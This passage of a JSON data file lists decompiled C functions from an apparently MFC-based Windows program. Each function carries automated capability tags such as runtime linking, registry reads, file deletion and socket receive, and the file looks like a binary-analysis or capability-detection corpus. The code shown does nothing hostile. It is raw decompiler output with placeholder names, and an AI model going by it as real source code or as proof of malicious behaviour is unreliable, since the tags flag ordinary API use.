        "decompiled_code": "\nuint __fastcall fcn.0041fe34(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x1c),  *(param_1 + 0x1c) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.0041fdef(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0041eeb7(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "00425b1a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00425b1a(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00401180();\n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.00434fd8(unaff_ESI, extraout_ECX);\n    iVar1 = *(iVar3 + 0xe4);\n    while (iVar1 == extraout_ECX) {\n        puVar2 = *(iVar3 + 0xe8);\n        *(puVar2[1] + 0xe4) = *puVar2;\n        *(puVar2[1] + 0xe8) = puVar2[2];\n        puVar2[1] = 0;\n        iVar1 = *(iVar3 + 0xe4);\n    }\n    if (*(extraout_ECX + 0x50) != 0) {\n        fcn.00423dfd(extraout_ECX);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041f719();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 355
    },
    "00426eaa": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00426eaa(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != 0) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "0042778d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042778d(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x004277bc;\n    iVar3 = fcn.00427754();\n    if ((iVar3 == 0) && (iVar3 = fcn.00408bb5(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x1c); iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x004277bc:\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar6);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar5 == 0)) || (iVar3 == iVar6))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 482
    },
    "0042979d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint __cdecl\nfcn.0042979d(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    uVar1 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x10) = &var_14h;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.0041eb10(4);\n    iVar2 = (**(*extraout_ECX + 0x5c))\n                      (0, \"AfxMDIFrame70s\", 0, uVar1 & 0xff4fffff, 0, 0, 0, 0, *(*(unaff_EBP + 8) + 0x1c), \n                       *(unaff_EBP + 0x18), 0);\n    if (iVar2 == 0) {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = extraout_ECX[0x16];\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0041bab6(iVar2 * 0xc);\n        uVar4 = *(unaff_EBP + 0xc);\n        extraout_ECX[0x23] = iVar2;\n        for (iVar2 = 0; iVar2 < extraout_ECX[0x16]; iVar2 = iVar2 + 1) {\n            iVar3 = iVar2 * 0xc;\n            *(extraout_ECX[0x23] + 4 + iVar3) = uVar4;\n            *(iVar3 + extraout_ECX[0x23]) = uVar4;\n            *(extraout_ECX[0x23] + 8 + iVar3) = 0xffffffff;\n        }\n        iVar2 = fcn.0041bab6(extraout_ECX[0x15] * 0xc);\n        uVar4 = *(unaff_EBP + 0x10);\n        extraout_ECX[0x24] = iVar2;\n        for (iVar2 = 0; iVar2 < extraout_ECX[0x15]; iVar2 = iVar2 + 1) {\n            iVar3 = iVar2 * 0xc;\n            *(extraout_ECX[0x24] + 4 + iVar3) = uVar4;\n            *(iVar3 + extraout_ECX[0x24]) = uVar4;\n            *(extraout_ECX[0x24] + 8 + iVar3) = 0xffffffff;\n        }\n        fcn.00429177(*(unaff_EBP + 0x14));\n        uVar4 = 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar4;\n}\n",
        "token_count": 795
    },
    "0042cdfc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042cdfc(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    iVar2 = 0;\n    if (0 < *(param_1 + 0x9c)) {\n        do {\n            if ((iVar2 != param_3) && (piVar1 = fcn.004089fd(iVar2),  *piVar1 == unaff_retaddr)) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(param_1 + 0x9c));\n    }\n    return -1;\n}\n",
        "token_count": 168
    },
    "0042d111": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d111(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    if (0 < *(param_1 + 0x9c)) {\n        do {\n            iVar1 = fcn.0042ce39();\n            if (iVar1 != 0) {\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *(param_1 + 0x9c));\n    }\n    return iVar2;\n}\n",
        "token_count": 147
    },
    "0042d7a1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d7a1(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = 0;\n    if (0 < *(param_1 + 0x9c)) {\n        do {\n            arg_8h = fcn.0042ce39(iVar1);\n            if (arg_8h != 0) {\n                fcn.004319c3();\n                fcn.004324fb(arg_8h, unaff_retaddr, 1);\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(param_1 + 0x9c));\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0042fab0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042fab0(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint lpMsg;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetCapture;\n    iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.USER32.dll_SetCapture)(*(*(param_1 + 0x68) + 0x1c));\n        fcn.0041eeb7(uVar3);\n        uVar3 = (*pcVar1)();\n        iVar2 = fcn.0041eeb7(uVar3);\n        if (iVar2 == *(param_1 + 0x68)) {\n            do {\n                uVar4 = 0;\n                uVar3 = 0;\n                iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n                if (iVar2 == 0) {\n                    fcn.0043a912(uVar4, var_14h);\n                    break;\n                }\n                if (var_18h == 0x100) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.0042f793(uVar3, 1, var_14h);\n                    }\n                    if (var_14h == 0x1b) break;\n                }\n                else if (var_18h == 0x101) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.0042f793(uVar3, 0, var_14h);\n                    }\n                }\n                else if (var_18h == 0x200) {\n                    if (*(param_1 + 0x88) == 0) {\n                        fcn.0042f7c7(var_8h, var_4h);\n                    }\n                    else {\n                        fcn.0042f714(var_8h, var_4h);\n                    }\n                }\n                else {\n                    if (var_18h == 0x202) {\n                        if (*(param_1 + 0x88) == 0) {\n                            fcn.0042fa6c();\n                        }\n                        else {\n                            fcn.0042f969();\n                        }\n                        return 1;\n                    }\n                    if (var_18h == 0x204) break;\n                    (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n                }\n                uVar3 = (*pcVar1)();\n                iVar2 = fcn.0041eeb7(uVar3);\n            } while (iVar2 == *(param_1 + 0x68));\n        }\n        fcn.0042f924();\n    }\n    return 0;\n}\n",
        "token_count": 657
    },
    "004315b7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004315b7(int32_t param_1, int32_t param_2)\n\n{\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_2 = fcn.0041fdef();\n    } while (param_2 != 0);\n    return 0;\n}\n",
        "token_count": 76
    },
    "00433495": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00433495(void)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFrameWnd.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004331c2();\n    iVar3 = fcn.00434fd8();\n    ppcVar1 = *(iVar3 + 0xec);\n    while (ppcVar1 == extraout_ECX) {\n        puVar2 = *(iVar3 + 0xf0);\n        *(puVar2[1] + 0xec) = *puVar2;\n        *(puVar2[1] + 0xf0) = puVar2[2];\n        puVar2[1] = 0;\n        ppcVar1 = *(iVar3 + 0xec);\n    }\n    if (extraout_ECX[0x2e] != NULL) {\n        fcn.0041bae1(extraout_ECX[0x2e]);\n    }\n    fcn.00401180();\n    *(unaff_EBP + -4) = 0;\n    fcn.0041af4f();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041f719();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 394
    },
    "00433e0c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433e0c(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0;\n        do {\n            if ((*(iVar1 * 8 + 0x44160c) & 0xf000) == (*(arg_8h + 0x7c) & 0xf000)) {\n                fcn.004329b1(*(iVar1 * 8 + 0x441608));\n                break;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < 4);\n    }\n    fcn.0042d84f(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 182
    },
    "00437676": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00437676(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_1;\n    uVar3 = 0;\n    if (iVar4 != 0) {\n        if (iVar4 == param_2) {\n            *param_1 = *(param_2 + param_1[1]);\n        }\n        else {\n            iVar1 = param_1[1];\n            do {\n                iVar2 = *(iVar1 + iVar4);\n                if (iVar2 == param_2) break;\n                iVar4 = iVar2;\n            } while (iVar2 != 0);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            *(iVar1 + iVar4) = *(iVar1 + param_2);\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 221
    },
    "004376ff": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004376ff(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    if ((0 < arg_8h) && (arg_8h < *(in_ECX + 0xc))) {\n        for (iVar3 = *(in_ECX + 0x14); iVar3 != 0; iVar3 = *(iVar3 + 4)) {\n            if (arg_8h < *(iVar3 + 8)) {\n                puVar2 = *(*(iVar3 + 0xc) + arg_8h * 4);\n                if (puVar2 != NULL) {\n                    (***puVar2)(1);\n                }\n                *(*(iVar3 + 0xc) + arg_8h * 4) = 0;\n            }\n        }\n        puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n        *puVar1 = *puVar1 & 0xfffffffe;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "0043a005": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a005(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0043500e();\n    if (arg_ch == 0) {\n        fcn.0041b5d4(arg_8h);\n        if (*(*(iVar1 + 0x30) + 0xc) == 0) {\n            piVar2 = fcn.0041eede(*(iVar1 + 0x2c));\n            if (piVar2 != NULL) {\n                (**(*piVar2 + 0x60))();\n                (**(*piVar2 + 4))(1);\n            }\n            *(iVar1 + 0x2c) = 0;\n            fcn.0041b4fa();\n            while (*(*(iVar1 + 0x38) + 0xc) != 0) {\n                uVar3 = fcn.0041aea9();\n                fcn.0041bae1(uVar3);\n            }\n        }\n    }\n    else {\n        iVar1 = fcn.0041b5ad(arg_8h, &arg_ch);\n        if (iVar1 != 0) {\n            iVar1 = arg_ch + -1;\n            if (iVar1 == 0) {\n                fcn.0041b5d4();\n            }\n            else {\n                piVar2 = fcn.0041b715(arg_8h);\n                *piVar2 = iVar1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "0041cb77": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.0041cb77(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(param_1);\n    fcn.0041cb4c(uVar1, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 76
    },
    "00420efc": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.00420efc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        iVar1 = fcn.00434fe8();\n        uVar2 = *(iVar1 + 0xc);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar2, param_1, 0xf0);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, iVar1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n        }\n    }\n    uVar2 = fcn.00420061(arg_8h);\n    if ((arg_8h != 0) && (iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 262
    },
    "00408c3c": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.00408c3c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x450a9c != 0) {\n        return *0x450a90 != 0;\n    }\n    *0x450aa0 = fcn.00408bef();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (((((iVar2 != 0) && (*0x450a80 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x43fce4),  *0x450a80 != 0)) &&\n         (*0x450a84 = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x450a84 != 0)) &&\n        ((*0x450a88 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x450a88 != 0 &&\n         (*0x450a8c = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x450a8c != 0)))) &&\n       ((*0x450a94 = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x450a94 != 0 &&\n        ((*0x450a90 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x450a90 != 0 &&\n         (*0x450a98 = (*pcVar1)(iVar2, \"EnumDisplayDevicesA\"),  *0x450a98 != 0)))))) {\n        *0x450a9c = 1;\n        return true;\n    }\n    *0x450a80 = 0;\n    *0x450a84 = 0;\n    *0x450a88 = 0;\n    *0x450a8c = 0;\n    *0x450a90 = 0;\n    *0x450a94 = 0;\n    *0x450a98 = 0;\n    *0x450a9c = 1;\n    return false;\n}\n",
        "token_count": 471
    },
    "0040c7a7": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.0040c7a7(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 155
    },
    "0041e32b": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.0041e32b(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t unaff_ESI;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"COMCTL32.DLL\");\n    uVar5 = uVar2;\n    if (uVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x4400c8);\n        uVar5 = 0;\n        if (pcVar3 == NULL) {\n            if ((unaff_ESI & 0x3fc0) == unaff_ESI) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = 0x3fc0;\n            }\n        }\n        else {\n            iVar4 = (*pcVar3)(unaff_EDI);\n            if ((iVar4 != 0) && (uVar5 = unaff_ESI,  iVar1 == 0)) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = unaff_ESI | 0x3fc0;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 336
    },
    "00425ea2": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00425ea2(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"GetLayout\");\n    if (pcVar2 == NULL) {\n        uVar1 = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n    }\n    else {\n        uVar1 = (*pcVar2)(*(param_1 + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 148
    },
    "00425ed8": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00425ed8(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    uVar3 = 0;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"SetLayout\");\n    if (pcVar2 == NULL) {\n        if (unaff_EDI != 0) {\n            uVar3 = 0xffffffff;\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n        }\n    }\n    else {\n        uVar3 = (*pcVar2)(*(param_1 + 4), unaff_EDI);\n    }\n    return uVar3;\n}\n",
        "token_count": 190
    },
    "00415dde": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415dde(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.0040b2c4(&lpLCData);\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 140
    },
    "00434d56": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434d56(code **param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    *param_1 = vtable._AFX_THREAD_STATE.0;\n    if (param_1[0xb] != NULL) {\n        (*pcVar1)(param_1[0xb]);\n    }\n    if (param_1[10] != NULL) {\n        (*pcVar1)(param_1[10]);\n    }\n    if (param_1[3] != NULL) {\n        fcn.00409f48(param_1[3]);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00421159": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nvoid fcn.00421159(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileA)(param_1, param_2);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(param_2);\n        fcn.004225d8(uVar2);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0042117e": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nvoid fcn.0042117e(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(param_1);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(unaff_retaddr);\n        fcn.004225d8(uVar2);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00437d10": {
        "rules": [
            "query or enumerate registry value",
            "read .ini file"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00437d10(uint arg_8h, uint lpAppName, uint lpKeyName, uint lpDefault)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1020h;\n    uint var_101ch;\n    uint var_1018h;\n    uint hKey;\n    uint lpReturnedString;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    fcn.0040a2a0();\n    uVar4 = *0x44e0fc;\n    *(unaff_EBP + -0x101c) = 0;\n    iVar2 = *(extraout_ECX + 0x50);\n    *(unaff_EBP + -0x10) = uVar4;\n    if (iVar2 == 0) {\n        if (*(unaff_EBP + 0x14) == 0) {\n            *(unaff_EBP + 0x14) = 0x43d878;\n        }\n        (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringA)\n                  (*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), unaff_EBP + -0x1010, 0x1000, \n                   *(extraout_ECX + 100));\n        var_ch = unaff_EBP + -0x1010;\n    }\n    else {\n        iVar2 = fcn.00437c61(*(unaff_EBP + 0xc));\n        *(unaff_EBP + -0x1014) = iVar2;\n        if (iVar2 != 0) {\n            piVar3 = fcn.0041bc88();\n            iVar2 = (**(*piVar3 + 0xc))();\n            *(unaff_EBP + 0xc) = iVar2 + 0x10;\n            pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n            *(unaff_EBP + -4) = 0;\n            iVar2 = (*pcVar1)(*(unaff_EBP + -0x1014), *(unaff_EBP + 0x10), 0, unaff_EBP + -0x101c, 0, \n                              unaff_EBP + -0x1020);\n            *(unaff_EBP + -0x1018) = iVar2;\n            if (iVar2 == 0) {\n                uVar4 = fcn.004026d0(*(unaff_EBP + -0x1020), unaff_EBP + -0x1020);\n                uVar4 = (*pcVar1)(*(unaff_EBP + -0x1014), *(unaff_EBP + 0x10), 0, unaff_EBP + -0x101c, uVar4);\n                *(unaff_EBP + -0x1018) = uVar4;\n                fcn.00407fe0(0xffffffff);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(unaff_EBP + -0x1014));\n            if (*(unaff_EBP + -0x1018) == 0) {\n                fcn.004026b0(unaff_EBP + 0xc);\n            }\n            else {\n                fcn.00406c60(*(unaff_EBP + 0x14));\n            }\n            fcn.00401180();\n            goto code_r0x00437e44;\n        }\n        var_ch = *(unaff_EBP + 0x14);\n    }\n    fcn.00406c60(var_ch);\ncode_r0x00437e44:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 928
    },
    "00437582": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00437582(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if ((0 < unaff_retaddr) && (unaff_retaddr < param_1[3])) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if ((iVar1 != 0) && (unaff_retaddr < *(iVar1 + 8))) {\n            uVar2 = *(*(iVar1 + 0xc) + unaff_retaddr * 4);\n            goto code_r0x004375b9;\n        }\n    }\n    uVar2 = 0;\ncode_r0x004375b9:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return uVar2;\n}\n",
        "token_count": 209
    },
    "00439a69": {
        "rules": [
            "receive data on socket",
            "receive data"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00439a69(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    (*_sym.imp.WS2_32.dll_recv)(*(param_1 + 4), param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 72
    },
    "00439aeb": {
        "rules": [
            "receive data on socket",
            "receive data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439aeb(uint buf, uint len, uint from, uint fromlen, uint flags)\n\n{\n    int32_t in_ECX;\n    \n    (*_sym.imp.WS2_32.dll_recvfrom)(*(in_ECX + 4), buf, len, flags, from, fromlen);\n    return;\n}\n",
        "token_count": 74
    },
    "00439a81": {
        "rules": [
            "send data on socket",
            "send data"
        ],
